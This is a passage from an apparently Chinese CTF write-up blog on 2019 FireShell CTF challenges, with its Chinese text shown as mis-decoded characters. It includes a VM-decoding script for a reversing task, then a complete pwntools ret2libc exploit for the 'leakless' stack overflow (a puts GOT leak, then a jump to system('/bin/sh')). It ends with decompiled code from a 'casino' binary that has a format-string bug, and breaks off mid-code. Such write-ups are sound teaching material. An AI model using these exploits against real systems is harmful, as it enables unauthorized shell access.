class="number">0x00000474</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000474</span>, <span class="number">0x00000000</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000498</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000498</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000016F8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000016FF</span>, <span class="number">0x00000000</span>, <span class="number">0x00000058</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000016FF</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000A0F9</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000A129</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0004681F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000049</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0004681F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000044</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00046863</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB7B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB7B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000055</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB7B</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB1C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB7B</span>, <span class="number">0x00000000</span>, <span class="number">0x0027AB7B</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000063</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000252</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000DEC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00006174</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000185D0</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0001860C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000063</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0001860C</span>, <span class="number">0x00000000</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00018626</span>, <span class="number">0x00000000</span>, <span class="number">0x00000064</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000057</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000000</span>, <span class="number">0x00018627</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000000</span>, <span class="number">0x0001868A</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000039</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000039</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000072</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000072</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000009F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000013E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000003BA</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000003E3</span>, <span class="number">0x00000000</span>, <span class="number">0x000003B3</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x000003E3</span>, <span class="number">0x00000000</span>, <span class="number">0x000003E3</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000030</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000180</span>, <span class="number">0x00000000</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000019A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000001A9</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000001E3</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000010FB</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000010FB</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000043EC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00021F60</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00021F69</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00043ED2</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F690</span>, <span class="number">0x00000000</span>, <span class="number">0x00000013</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F690</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F690</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F660</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F690</span>, <span class="number">0x00000000</span>, <span class="number">0x0021F690</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000003CC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000025</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000003CC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000003CC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000003CC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000B64</span>, <span class="number">0x00000000</span>, <span class="number">0x00000062</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000B64</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000071E8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000071E8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000721B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000726F</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000072B9</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000015</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000053</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF0</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D88</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000021</span>, <span class="number">0x00000000</span>, <span class="number">0x00000044</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000021</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000042</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000049</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000FF</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000128</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000012E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000000</span>, <span class="number">0x00000115</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000002EE</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000002EE</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BB8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BB8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000014</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000035</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000058</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000042</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C28</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C28</span>, <span class="number">0x00000000</span>, <span class="number">0x00000022</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C4A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D72</span>, <span class="number">0x00000000</span>, <span class="number">0x00000053</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D72</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000000</span>, <span class="number">0x000228E8</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000006</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>]</span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">buf = [<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">530</span>)]</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    <span class="keyword">if</span> i - <span class="number">1</span> != tmp <span class="keyword">and</span> buf[i - <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        flag += chr(buf[i])</span><br><span class="line">        tmp = i - <span class="number">1</span></span><br><span class="line">    c = code[j]</span><br><span class="line">    <span class="keyword">if</span> c == <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        buf[i] = code[j]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">1</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] += buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Over'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">4</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] *= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">5</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] /= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">6</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] -= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">2</span>:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'buf[&#123;&#125;] = &#123;&#125;'</span>.format(str(i), hex(buf[i]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨bufçš„å€¼ä¸­å‘ç°<code>buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...</code>ï¼ŒçŒœæµ‹æ¯æ¬¡è¾“å‡ºä¸º<code>buf[i] = 0</code>çš„åä¸€ä¸ªå€¼å³<code>buf[i + 1]</code>ä¸ºflagçš„å€¼ã€‚å¯¹è„šæœ¬ç¨ä½œä¿®æ”¹åå¾—åˆ°flagã€‚</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h2><p>ç®€å•æ ˆæº¢å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[leakless] checksec leakless</span><br><span class="line">[*] '/root/ctf/2019-FireShell/leakless/leakless'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æ²¡å¼€canaryå’Œpieã€‚å¯ä»¥çœ‹åˆ°æº¢å‡ºæ¼æ´åœ¨è¿™é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> feedme()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡å…ˆæ³„éœ²å‡ºputsçš„åœ°å€ï¼Œç„¶åæ‰¾åˆ°libcçš„ç‰ˆæœ¬ï¼Œreturnå›<code>feedme()</code>å‡½æ•°ã€‚ç¬¬äºŒæ¬¡ç›´æ¥è·³systemã€‚expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = remote(<span class="string">'35.243.188.20'</span>, <span class="number">2002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./leakless'</span>)</span><br><span class="line">offset = <span class="number">76</span></span><br><span class="line">feedme = elf.symbols[<span class="string">'feedme'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'feedme = '</span> + hex(feedme))</span><br><span class="line">log.success(<span class="string">'puts_plt = '</span> + hex(puts_plt))</span><br><span class="line">log.success(<span class="string">'puts_got = '</span> + hex(puts_got))</span><br><span class="line">payload1 = flat([</span><br><span class="line"><span class="string">'A'</span> * offset, </span><br><span class="line">puts_plt, </span><br><span class="line">feedme, </span><br><span class="line">puts_got</span><br><span class="line">])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'puts = '</span> + hex(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">payload2 = flat([</span><br><span class="line"><span class="string">'A'</span> * offset, </span><br><span class="line">system, </span><br><span class="line"><span class="number">0x12345678</span>,</span><br><span class="line">str_bin_sh</span><br><span class="line">])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h2><p>é™¤äº†pieå…¶ä»–ä¿æŠ¤éƒ½å¼€äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[casino] checksec casino                                                                       11:02:20 </span><br><span class="line">[*] '/root/ctf/2019-FireShell/casino/casino'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>åœ¨idaé‡ŒæŸ¥çœ‹mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  seed = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="number">0L</span>L) / <span class="number">0xA</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is your name? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome "</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  seed += bet;</span><br><span class="line">  srand(seed);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d/100] Guess my number: "</span>, i);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Sorry! It was not my number"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct!"</span>);</span><br><span class="line">    v5 += bet;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span 